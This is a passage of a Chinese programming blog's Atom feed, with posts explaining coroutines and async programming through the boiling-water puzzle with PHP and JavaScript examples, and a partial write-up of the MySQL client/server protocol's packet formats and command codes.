&lt;h4 id=&quot;pcre&quot;&gt;&lt;a href=&quot;#pcre&quot; class=&quot;headerlink&quot; title=&quot;pcre&quot;&gt;&lt;/a&gt;pcre&lt;/h4&gt;&lt;p&gt;&lt;code&gt;sudo apt-get install -y libpcre3-dev&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;jpeg&quot;&gt;&lt;a href=&quot;#jpeg&quot; class=&quot;headerlink&quot; title=&quot;jpeg&quot;&gt;&lt;/a&gt;jpeg&lt;/h4&gt;&lt;p&gt;&lt;code&gt;sudo apt-get install -y libjpeg62-dev&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://www.twosee.cn/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>并发,协程与烧开水问题</title>
    <link href="http://www.twosee.cn/2018/05/21/coroutine-boil-water/"/>
    <id>http://www.twosee.cn/2018/05/21/coroutine-boil-water/</id>
    <published>2018-05-21T07:22:42.000Z</published>
    <updated>2018-06-14T04:08:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言扯淡"><a href="#前言扯淡" class="headerlink" title="前言扯淡"></a>前言扯淡</h2><p>烧水是一件很神奇的事情, 首先有这么一个家喻户晓的传说故事:</p><p> “瓦特小的时候，看见炉子上壶里的水沸腾了。蒸汽把壶盖顶了起来，瓦特从中受到启发，长大后发明了蒸汽机，成为著名的发明家。”</p><p>当然，真实的蒸汽机的真正意义上发明也是类似的, “约1679年法国物理学家丹尼斯·巴本在观察蒸汽冒出他的高压锅后制造了第一台蒸汽机的工作模型”。后来，人类进入了蒸汽时代。</p><p>直到今天都没有找到能够替代”烧开水”获取能源的方案，这个有意思的概念来源于一个知乎问题<a href="https://www.zhihu.com/question/22355784" target="_blank" rel="noopener">人类的能源大多都是靠烧开水，这种说法正确吗？</a>，最后得出的结论是：我们寿命内，可用的能源主要来源靠烧水。</p><a id="more"></a><h2 id="烧开水问题"><a href="#烧开水问题" class="headerlink" title="烧开水问题"></a>烧开水问题</h2><p>当然，今天想说的协程之于烧开水问题，和上述烧开水没有一毛钱关系(狗头，而是与另外一个家喻户晓的烧开水问题息息相关：</p><blockquote><p>烧开水10分钟,洗衣机洗衣服21分钟,做作业20分钟,最少多少分钟完成这些事情</p></blockquote><p>这是我们小学时候常做的逻辑题，那时候心智不够，很容易掉进陷阱，没有能够<strong>调度</strong>各个任务的思维，把时间加在一起，这就是经典的<strong>同步阻塞</strong>：</p><ol><li>你烧水</li><li>等水开</li><li>水开后用洗衣机洗衣服</li><li>等衣服洗完</li><li>做作业</li></ol><p>而正解是，我们要给事件分类，哪些是可以并发且可并行的，哪些是需要单独做的：</p><ul><li>可并发并行的：洗衣机洗衣服，烧开水 </li><li>需要单独做的：做作业</li></ul><p>将他们类比成计算机的任务</p><ul><li>耗时任务，但不需要使用脑子(CPU)的：磁盘IO，可定时/后台运行的任务等</li><li>需要CPU密集计算处理的：业务逻辑，数据分析等</li></ul><p>那么就是:</p><ol><li>设定好洗衣机和烧上水 (发起并发请求), 挂起任务让出控制权(yield), 然后马上去写作业(CPU继续干活)</li><li>完成提示音通知你任务完成你可以收尾(事件回调)</li></ol><p>这样我们实际上耗费的时间就是 <code>CPU运算任务耗时 + Max(...可并发并行任务耗时)</code></p><p>这是这个问题最优解, 大脑(CPU)没有把时间浪费到无谓的等待中, 而(客户端)可并发特性使得两个请求可以同时开始，最后洗衣机的电子音和水壶的水烧开的声音会提醒你(Callback)让你收尾处理这两个事件的完成</p><h2 id="IO阻塞"><a href="#IO阻塞" class="headerlink" title="IO阻塞"></a>IO阻塞</h2><h3 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h3><p>我们可以看下面这样一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = file_get_contents(<span class="string">'./data.json'</span>);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><p>这是常见的文件读取操作, 在file_get_contents函数从磁盘中拿回文件数据前, 代码并不会继续运行, 而是等待返回, 因为后续的打印数据依赖上一条指令获取的数据的返回值, 这就是常见的同步编程.</p><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><p>我们再来看一个经典的jQuery时代的ajax</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">"foo"</span>,</span><br><span class="line">    data:<span class="number">1</span>,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url: <span class="string">"bar"</span>,</span><br><span class="line">            data:a,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">b</span>) </span>&#123;</span><br><span class="line">                $.ajax(&#123;</span><br><span class="line">                    url: <span class="string">"baz"</span>,</span><br><span class="line">                    data:b,</span><br><span class="line">                    success: <span class="function"><span class="keyword">function</span> (<span class="params">c</span>) </span>&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(c)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'lol~'</span>)</span><br></pre></td></tr></table></figure><p>代码在执行到ajax的时候, 函数会直接返回, 你马上就可以看到屏幕上欢快地打印出了<code>lol~</code></p><p>这就是异步, 这样你永远不会被IO阻塞, 但是它带来了新的问题, 在你运行到lol之后, 你就不知道现在代码运行到哪去了, 你只能等待回调被触发, 然后屏幕上打印出相应的log, 它的执行不是单层顺序的, 而是嵌套的.</p><p>如果在业务代码中, 这样的层层嵌套可读性可想而知.</p><h3 id="异步-1"><a href="#异步-1" class="headerlink" title="异步+"></a>异步+</h3><p>后来为了解决异步回调地狱, 发展出了Promise的方案, 这样的写法比回调要直观多了</p><p>以下代码引用自 <a href="https://segmentfault.com/a/1190000007535316" target="_blank" rel="noopener">理解 JavaScript 的 async/await</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">takeLongTime</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> resolve(n + <span class="number">200</span>), n);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step1</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`step1 with <span class="subst">$&#123;n&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span> takeLongTime(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step2</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`step2 with <span class="subst">$&#123;n&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span> takeLongTime(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step3</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`step3 with <span class="subst">$&#123;n&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span> takeLongTime(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doIt</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.time(<span class="string">"doIt"</span>);</span><br><span class="line">    <span class="keyword">const</span> time1 = <span class="number">300</span>;</span><br><span class="line">    <span class="comment">//promise的链式调用,比callback清晰多了</span></span><br><span class="line">    step1(time1)</span><br><span class="line">        .then(<span class="function"><span class="params">time2</span> =&gt;</span> step2(time2))</span><br><span class="line">        .then(<span class="function"><span class="params">time3</span> =&gt;</span> step3(time3))</span><br><span class="line">        .then(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`result is <span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">            <span class="built_in">console</span>.timeEnd(<span class="string">"doIt"</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line">doIt();</span><br></pre></td></tr></table></figure><h3 id="异步-2"><a href="#异步-2" class="headerlink" title="异步++"></a>异步++</h3><p>Promise以后, 又进化出了async/await语法糖, 可以说是异步终极方案了, 看起来简直就跟同步代码一模一样!</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">doIt</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.time(<span class="string">"doIt"</span>);</span><br><span class="line">    <span class="keyword">const</span> time1 = <span class="number">300</span>;</span><br><span class="line">    <span class="keyword">const</span> time2 = <span class="keyword">await</span> step1(time1);</span><br><span class="line">    <span class="keyword">const</span> time3 = <span class="keyword">await</span> step2(time2);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> step3(time3);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`result is <span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.timeEnd(<span class="string">"doIt"</span>);</span><br><span class="line">&#125;</span><br><span class="line">doIt();</span><br></pre></td></tr></table></figure><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p>其实在实际的程序中, 磁盘IO等阻塞的时间是远远大于CPU运算时间的, <strong>根据Amdahl定理, 你想要加速一个系统, 必须提升全系统中相当大的部分的速度</strong>, 而现在的大部分WEB服务, <strong>瓶颈都在数据库IO而非密集运算</strong>, 大家可以参考一篇文章: <a href="http://twosee.cn/2017/12/28/how-slow-is-disk-and-network/" target="_blank" rel="noopener">让 CPU 告诉你硬盘和网络到底有多慢</a>，这篇文章很形象地告诉了你, IO是如何把团队发育带崩的：</p><p><strong>如果假设CPU执行一个指令需要1秒, 那么磁盘寻址花费的时间就是10个月, 从磁盘读取 1MB 连续数据需要20个月! 而如果是网络IO, 很可能达到十数年甚至更久!</strong></p><p>也就是说, 在IO等待的时候, CPU足足荒废了几年的美好光阴!</p><p>让我们来看看这张经典的存储器层次结构示例:</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://ws1.sinaimg.cn/large/006DQdzWly1frpv6p5dnmj30vn0h5tc2.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以如果能把IO阻塞浪费的时间优化掉, 就可以提升了多倍的并发处理能力, 比起优化代码逻辑和算法的收益更加可观, 因此而节省的硬件成本也相当可观(否则你会陷入不断加机器/换SSD/加内存做cache的困扰中)</p><h2 id="协程不能解决的问题"><a href="#协程不能解决的问题" class="headerlink" title="协程不能解决的问题"></a>协程不能解决的问题</h2><blockquote><p>小学课上，女孩对男孩说“蒸一个包子要3分钟，那蒸3个包子要几分钟”，男孩说“9分钟”，女孩说你傻呀，你家蒸包子是一个一个地蒸啊…然后男孩对女孩说“吃一个苹果要一分钟，那吃9个苹果要几分钟”，女孩说你以为我和你一样傻啊，当然是9分钟了。男孩什么也没说，直接拿了9个苹果放到女孩面前说你9分钟把它们都吃完吧……</p></blockquote><p>包子可以一起蒸, 是因为一个正常蒸笼(预防杠精)有蒸三个正常包子(预防杠精)的能力</p><p>苹果只能一个个吃, 是因为正常人一般(预防杠精)只有一次吃一个正常苹果(预防杠精)的能力</p><p>所以协程不能解决的问题是: <strong>它不能解决你数据库的上限瓶颈, 数据库能承受多少压力, 它还是多少</strong></p><p>(已做连接池的情况下, 连接池是常驻内存运行的福利, 和协程无关)</p><p>有人在PHPcon上问Rango: “韩老师, 我们的业务在高并发的时候, redis数据库很容易被击穿, 这该怎么办?”</p><p>Rango就答了: “这不是swoole可以解决的问题, 你可以了解下<code>twemproxy</code></p><h2 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h2><p>这两个词对于编程新手就像<code>/</code>和<code>\</code>两个符号一样难以记忆, 网上也没有看到一个比较好又形象的通俗解释, 在这里我可以给出一种不错的记忆方法:</p><p>并发可以理解为客户端的一个特性, 客户端可以一次性发出多个请求, 称之为<code>并发</code>.</p><p>并行可以理解为服务器同时能处理任务的这个能力, 比如一般来说, MySQL一个连接就是一个线程, 如果不使用线程池等技术, 它所能创建线程数量就是它可以<code>并行</code>处理请求的能力.</p><p>并发: 同时发出(请求)</p><p>并行: 同时执行(任务)</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言扯淡&quot;&gt;&lt;a href=&quot;#前言扯淡&quot; class=&quot;headerlink&quot; title=&quot;前言扯淡&quot;&gt;&lt;/a&gt;前言扯淡&lt;/h2&gt;&lt;p&gt;烧水是一件很神奇的事情, 首先有这么一个家喻户晓的传说故事:&lt;/p&gt;
&lt;p&gt; “瓦特小的时候，看见炉子上壶里的水沸腾了。蒸汽把壶盖顶了起来，瓦特从中受到启发，长大后发明了蒸汽机，成为著名的发明家。”&lt;/p&gt;
&lt;p&gt;当然，真实的蒸汽机的真正意义上发明也是类似的, “约1679年法国物理学家丹尼斯·巴本在观察蒸汽冒出他的高压锅后制造了第一台蒸汽机的工作模型”。后来，人类进入了蒸汽时代。&lt;/p&gt;
&lt;p&gt;直到今天都没有找到能够替代”烧开水”获取能源的方案，这个有意思的概念来源于一个知乎问题&lt;a href=&quot;https://www.zhihu.com/question/22355784&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;人类的能源大多都是靠烧开水，这种说法正确吗？&lt;/a&gt;，最后得出的结论是：我们寿命内，可用的能源主要来源靠烧水。&lt;/p&gt;
    
    </summary>
    
    
      <category term="coroutine" scheme="http://www.twosee.cn/tags/coroutine/"/>
    
  </entry>
  
  <entry>
    <title>[整理] MySQL协议分析</title>
    <link href="http://www.twosee.cn/2018/05/15/mysql-protocol/"/>
    <id>http://www.twosee.cn/2018/05/15/mysql-protocol/</id>
    <published>2018-05-15T08:05:26.000Z</published>
    <updated>2018-06-14T17:26:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[TOC]</p><h2 id="1-交互过程"><a href="#1-交互过程" class="headerlink" title="1 交互过程"></a>1 交互过程</h2><p>MySQL客户端与服务器的交互主要分为两个阶段：握手认证阶段和命令执行阶段。</p><h3 id="1-1-握手认证阶段"><a href="#1-1-握手认证阶段" class="headerlink" title="1.1 握手认证阶段"></a>1.1 握手认证阶段</h3><p>握手认证阶段为客户端与服务器建立连接后进行，交互过程如下：</p><ul><li>服务器 -&gt; 客户端：握手初始化消息</li><li>客户端 -&gt; 服务器：登陆认证消息</li><li>服务器 -&gt; 客户端：认证结果消息</li></ul><h3 id="1-2-命令执行阶段"><a href="#1-2-命令执行阶段" class="headerlink" title="1.2 命令执行阶段"></a>1.2 命令执行阶段</h3><p>客户端认证成功后，会进入命令执行阶段，交互过程如下：</p><ul><li>客户端 -&gt; 服务器：执行命令消息</li><li>服务器 -&gt; 客户端：命令执行结果</li></ul><a id="more"></a><p><strong>MySQL客户端与服务器的完整交互过程如下</strong>：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://ws1.sinaimg.cn/large/006DQdzWly1fsb7y00rsyj30cc0ddwew.jpg" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="2-基本类型"><a href="#2-基本类型" class="headerlink" title="2 基本类型"></a>2 基本类型</h2><h3 id="2-1-整型值"><a href="#2-1-整型值" class="headerlink" title="2.1 整型值"></a>2.1 整型值</h3><p>MySQL报文中整型值分别有1、2、3、4、8字节长度，使用小字节序传输。</p><h3 id="2-2-字符串（以NULL结尾）（Null-Terminated-String）"><a href="#2-2-字符串（以NULL结尾）（Null-Terminated-String）" class="headerlink" title="2.2 字符串（以NULL结尾）（Null-Terminated String）"></a>2.2 字符串（以NULL结尾）（Null-Terminated String）</h3><p>字符串长度不固定，当遇到’NULL’（0x00）字符时结束。</p><h3 id="2-3-二进制数据（长度编码）（Length-Coded-Binary）"><a href="#2-3-二进制数据（长度编码）（Length-Coded-Binary）" class="headerlink" title="2.3 二进制数据（长度编码）（Length Coded Binary）"></a>2.3 二进制数据（长度编码）（Length Coded Binary）</h3><p>数据长度不固定，长度值由数据前的1-9个字节决定，其中长度值所占的字节数不定，字节数由第1个字节决定，如下表：</p><table><thead><tr><th>第一个字节值</th><th>后续字节数</th><th>长度值说明</th></tr></thead><tbody><tr><td>0-250</td><td>0</td><td>第一个字节值即为数据的真实长度</td></tr><tr><td>251</td><td>0</td><td>空数据，数据的真实长度为零</td></tr><tr><td>252</td><td>2</td><td>后续额外2个字节标识了数据的真实长度</td></tr><tr><td>253</td><td>3</td><td>后续额外3个字节标识了数据的真实长度</td></tr><tr><td>254</td><td>8</td><td>后续额外8个字节标识了数据的真实长度</td></tr></tbody></table><h3 id="2-4-字符串（长度编码）（Length-Coded-String）"><a href="#2-4-字符串（长度编码）（Length-Coded-String）" class="headerlink" title="2.4 字符串（长度编码）（Length Coded String）"></a>2.4 字符串（长度编码）（Length Coded String）</h3><p>字符串长度不固定，无’NULL’（0x00）结束符，编码方式与上面的 Length Coded Binary 相同。</p><h2 id="3-报文结构"><a href="#3-报文结构" class="headerlink" title="3 报文结构"></a>3 报文结构</h2><p>报文分为消息头和消息体两部分，其中消息头占用固定的4个字节，消息体长度由消息头中的长度字段决定，报文结构如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://hutaow.com/images/articles/201311/mysql_protocol_struct.png" alt="MySQL报文结构" title="">                </div>                <div class="image-caption">MySQL报文结构</div>            </figure><h3 id="3-1-消息头"><a href="#3-1-消息头" class="headerlink" title="3.1 消息头"></a>3.1 消息头</h3><h4 id="3-1-1-报文长度"><a href="#3-1-1-报文长度" class="headerlink" title="3.1.1 报文长度"></a>3.1.1 报文长度</h4><p>用于标记当前请求消息的实际数据长度值，以字节为单位，占用3个字节，最大值为 0xFFFFFF，即接近 16 MB 大小（比16MB少1个字节）。</p><h4 id="3-1-2-序号"><a href="#3-1-2-序号" class="headerlink" title="3.1.2 序号"></a>3.1.2 序号</h4><p>在一次完整的请求/响应交互过程中，用于保证消息顺序的正确，每次客户端发起请求时，序号值都会从0开始计算。</p><h3 id="3-2-消息体"><a href="#3-2-消息体" class="headerlink" title="3.2 消息体"></a>3.2 消息体</h3><p>消息体用于存放请求的内容及响应的数据，长度由消息头中的长度值决定。</p><h2 id="4-报文类型"><a href="#4-报文类型" class="headerlink" title="4 报文类型"></a>4 报文类型</h2><h3 id="4-1-登陆认证交互报文"><a href="#4-1-登陆认证交互报文" class="headerlink" title="4.1 登陆认证交互报文"></a>4.1 登陆认证交互报文</h3><h4 id="4-1-1-握手初始化报文（服务器-gt-客户端）"><a href="#4-1-1-握手初始化报文（服务器-gt-客户端）" class="headerlink" title="4.1.1 握手初始化报文（服务器 -&gt; 客户端）"></a>4.1.1 握手初始化报文（服务器 -&gt; 客户端）</h4><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://hutaow.com/images/articles/201311/mysql_protocol_handshake.png" alt="MySQL握手初始化报文" title="">                </div>                <div class="image-caption">MySQL握手初始化报文</div>            </figure><p><strong>服务协议版本号</strong>：该值由 PROTOCOL_VERSION 宏定义决定（参考MySQL源代码<code>/include/mysql_version.h</code>头文件定义）</p><p><strong>服务版本信息</strong>：该值为字符串，由 MYSQL_SERVER_VERSION 宏定义决定（参考MySQL源代码<code>/include/mysql_version.h</code>头文件定义）</p><p><strong>服务器线程ID</strong>：服务器为当前连接所创建的线程ID。</p><p><strong>挑战随机数</strong>：MySQL数据库用户认证采用的是挑战/应答的方式，服务器生成该挑战数并发送给客户端，由客户端进行处理并返回相应结果，然后服务器检查是否与预期的结果相同，从而完成用户认证的过程。</p><p><strong>服务器权能标志</strong>：用于与客户端协商通讯方式，各标志位含义如下（参考MySQL源代码<code>/include/mysql_com.h</code>中的宏定义）：</p><table><thead><tr><th>标志位名称</th><th>标志位</th><th>说明</th></tr></thead><tbody><tr><td>CLIENT_LONG_PASSWORD</td><td>0x0001</td><td>new more secure passwords</td></tr><tr><td>CLIENT_FOUND_ROWS</td><td>0x0002</td><td>Found instead of affected rows</td></tr><tr><td>CLIENT_LONG_FLAG</td><td>0x0004</td><td>Get all column flags</td></tr><tr><td>CLIENT_CONNECT_WITH_DB</td><td>0x0008</td><td>One can specify db on connect</td></tr><tr><td>CLIENT_NO_SCHEMA</td><td>0x0010</td><td>Do not allow database.table.column</td></tr><tr><td>CLIENT_COMPRESS</td><td>0x0020</td><td>Can use compression protocol</td></tr><tr><td>CLIENT_ODBC</td><td>0x0040</td><td>Odbc client</td></tr><tr><td>CLIENT_LOCAL_FILES</td><td>0x0080</td><td>Can use LOAD DATA LOCAL</td></tr><tr><td>CLIENT_IGNORE_SPACE</td><td>0x0100</td><td>Ignore spaces before ‘(‘</td></tr><tr><td>CLIENT_PROTOCOL_41</td><td>0x0200</td><td>New 4.1 protocol</td></tr><tr><td>CLIENT_INTERACTIVE</td><td>0x0400</td><td>This is an interactive client</td></tr><tr><td>CLIENT_SSL</td><td>0x0800</td><td>Switch to SSL after handshake</td></tr><tr><td>CLIENT_IGNORE_SIGPIPE</td><td>0x1000</td><td>IGNORE sigpipes</td></tr><tr><td>CLIENT_TRANSACTIONS</td><td>0x2000</td><td>Client knows about transactions</td></tr><tr><td>CLIENT_RESERVED</td><td>0x4000</td><td>Old flag for 4.1 protocol</td></tr><tr><td>CLIENT_SECURE_CONNECTION</td><td>0x8000</td><td>New 4.1 authentication</td></tr><tr><td>CLIENT_MULTI_STATEMENTS</td><td>0x0001 0000</td><td>Enable/disable multi-stmt support</td></tr><tr><td>CLIENT_MULTI_RESULTS</td><td>0x0002 0000</td><td>Enable/disable multi-results</td></tr></tbody></table><p><strong>字符编码</strong>：标识服务器所使用的字符集。</p><p><strong>服务器状态</strong>：状态值定义如下（参考MySQL源代码<code>/include/mysql_com.h</code>中的宏定义）：</p><table><thead><tr><th>状态名称</th><th>状态值</th></tr></thead><tbody><tr><td>SERVER_STATUS_IN_TRANS</td><td>0x0001</td></tr><tr><td>SERVER_STATUS_AUTOCOMMIT</td><td>0x0002</td></tr><tr><td>SERVER_STATUS_CURSOR_EXISTS</td><td>0x0040</td></tr><tr><td>SERVER_STATUS_LAST_ROW_SENT</td><td>0x0080</td></tr><tr><td>SERVER_STATUS_DB_DROPPED</td><td>0x0100</td></tr><tr><td>SERVER_STATUS_NO_BACKSLASH_ESCAPES</td><td>0x0200</td></tr><tr><td>SERVER_STATUS_METADATA_CHANGED</td><td>0x0400</td></tr></tbody></table><h4 id="4-1-2-登陆认证报文（客户端-gt-服务器）"><a href="#4-1-2-登陆认证报文（客户端-gt-服务器）" class="headerlink" title="4.1.2 登陆认证报文（客户端 -&gt; 服务器）"></a>4.1.2 登陆认证报文（客户端 -&gt; 服务器）</h4><p><strong>MySQL 4.0 及之前的版本</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://hutaow.com/images/articles/201311/mysql_protocol_auth_40.png" alt="MySQL登陆认证报文(4.0及之前的版本)" title="">                </div>                <div class="image-caption">MySQL登陆认证报文(4.0及之前的版本)</div>            </figure><p><strong>MySQL 4.1 及之后的版本</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://hutaow.com/images/articles/201311/mysql_protocol_auth_41.png" alt="MySQL登陆认证报文(4.1及之后的版本)" title="">                </div>                <div class="image-caption">MySQL登陆认证报文(4.1及之后的版本)</div>            </figure><p><strong>客户端权能标志</strong>：用于与客户端协商通讯方式，标志位含义与握手初始化报文中的相同。客户端收到服务器发来的初始化报文后，会对服务器发送的权能标志进行修改，保留自身所支持的功能，然后将权能标返回给服务器，从而保证服务器与客户端通讯的兼容性。</p><p><strong>最大消息长度</strong>：客户端发送请求报文时所支持的最大消息长度值。</p><p><strong>字符编码</strong>：标识通讯过程中使用的字符编码，与服务器在认证初始化报文中发送的相同。</p><p><strong>用户名</strong>：客户端登陆用户的用户名称。</p><p><strong>挑战认证数据</strong>：客户端用户密码使用服务器发送的挑战随机数进行加密后，生成挑战认证数据，然后返回给服务器，用于对用户身份的认证。</p><p><strong>数据库名称</strong>：当客户端的权能标志位 CLIENT_CONNECT_WITH_DB 被置位时，该字段必须出现。</p><h3 id="4-2-客户端命令请求报文（客户端-gt-服务器）"><a href="#4-2-客户端命令请求报文（客户端-gt-服务器）" class="headerlink" title="4.2 客户端命令请求报文（客户端 -&gt; 服务器）"></a>4.2 客户端命令请求报文（客户端 -&gt; 服务器）</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://hutaow.com/images/articles/201311/mysql_protocol_command.png" alt="MySQL客户端命令请求报文" title="">                </div>                <div class="image-caption">MySQL客户端命令请求报文</div>            </figure><p><strong>命令</strong>：用于标识当前请求消息的类型，例如切换数据库（0x02）、查询命令（0x03）等。命令值的取值范围及说明如下表（参考MySQL源代码<code>/include/mysql_com.h</code>头文件中的定义）：</p><table><thead><tr><th>类型值</th><th>命令</th><th>功能</th><th>关联函数</th></tr></thead><tbody><tr><td>0x00</td><td>COM_SLEEP</td><td>（内部线程状态）</td><td>（无）</td></tr><tr><td>0x01</td><td>COM_QUIT</td><td>关闭连接</td><td>mysql_close</td></tr><tr><td>0x02</td><td>COM_INIT_DB</td><td>切换数据库</td><td>mysql_select_db</td></tr><tr><td>0x03</td><td>COM_QUERY</td><td>SQL查询请求</td><td>mysql_real_query</td></tr><tr><td>0x04</td><td>COM_FIELD_LIST</td><td>获取数据表字段信息</td><td>mysql_list_fields</td></tr><tr><td>0x05</td><td>COM_CREATE_DB</td><td>创建数据库</td><td>mysql_create_db</td></tr><tr><td>0x06</td><td>COM_DROP_DB</td><td>删除数据库</td><td>mysql_drop_db</td></tr><tr><td>0x07</td><td>COM_REFRESH</td><td>清除缓存</td><td>mysql_refresh</td></tr><tr><td>0x08</td><td>COM_SHUTDOWN</td><td>停止服务器</td><td>mysql_shutdown</td></tr><tr><td>0x09</td><td>COM_STATISTICS</td><td>获取服务器统计信息</td><td>mysql_stat</td></tr><tr><td>0x0A</td><td>COM_PROCESS_INFO</td><td>获取当前连接的列表</td><td>mysql_list_processes</td></tr><tr><td>0x0B</td><td>COM_CONNECT</td><td>（内部线程状态）</td><td>（无）</td></tr><tr><td>0x0C</td><td>COM_PROCESS_KILL</td><td>中断某个连接</td><td>mysql_kill</td></tr><tr><td>0x0D</td><td>COM_DEBUG</td><td>保存服务器调试信息</td><td>mysql_dump_debug_info</td></tr><tr><td>0x0E</td><td>COM_PING</td><td>测试连通性</td><td>mysql_ping</td></tr><tr><td>0x0F</td><td>COM_TIME</td><td>（内部线程状态）</td><td>（无）</td></tr><tr><td>0x10</td><td>COM_DELAYED_INSERT</td><td>（内部线程状态）</td><td>（无）</td></tr><tr><td>0x11</td><td>COM_CHANGE_USER</td><td>重新登陆（不断连接）</td><td>mysql_change_user</td></tr><tr><td>0x12</td><td>COM_BINLOG_DUMP</td><td>获取二进制日志信息</td><td>（无）</td></tr><tr><td>0x13</td><td>COM_TABLE_DUMP</td><td>获取数据表结构信息</td><td>（无）</td></tr><tr><td>0x14</td><td>COM_CONNECT_OUT</td><td>（内部线程状态）</td><td>（无）</td></tr><tr><td>0x15</td><td>COM_REGISTER_SLAVE</td><td>从服务器向主服务器进行注册</td><td>（无）</td></tr><tr><td>0x16</td><td>COM_STMT_PREPARE</td><td>预处理SQL语句</td><td>mysql_stmt_prepare</td></tr><tr><td>0x17</td><td>COM_STMT_EXECUTE</td><td>执行预处理语句</td><td>mysql_stmt_execute</td></tr><tr><td>0x18</td><td>COM_STMT_SEND_LONG_DATA</td